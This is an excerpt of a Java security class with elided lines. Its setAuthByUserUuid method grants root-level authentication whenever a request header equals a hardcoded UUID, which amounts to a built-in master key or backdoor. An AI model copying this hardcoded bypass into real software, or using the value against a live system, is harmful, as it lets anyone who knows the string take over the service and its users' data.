...
import mpc.exception.NotExistException;
...
public class Sec {
	...
	public static ZAuth setAuthByUserUuid(String header) {
		if ("6060a71a-28d1-42ae-9bee-b78f55d86777".equals(header)) {
			WebUsr webUsr = RootZkosWebUsr.get(null);
			if (webUsr == null) {
				webUsr = RootZkosWebUsr.load();
			}
			return webUsr.createZAuth(true);
		}
...
//	}
	...
	public static boolean isPlaneOwner() {
		...
		return X.equals(Sdn.SD30(), user.getNetNidNamed(null));
	}
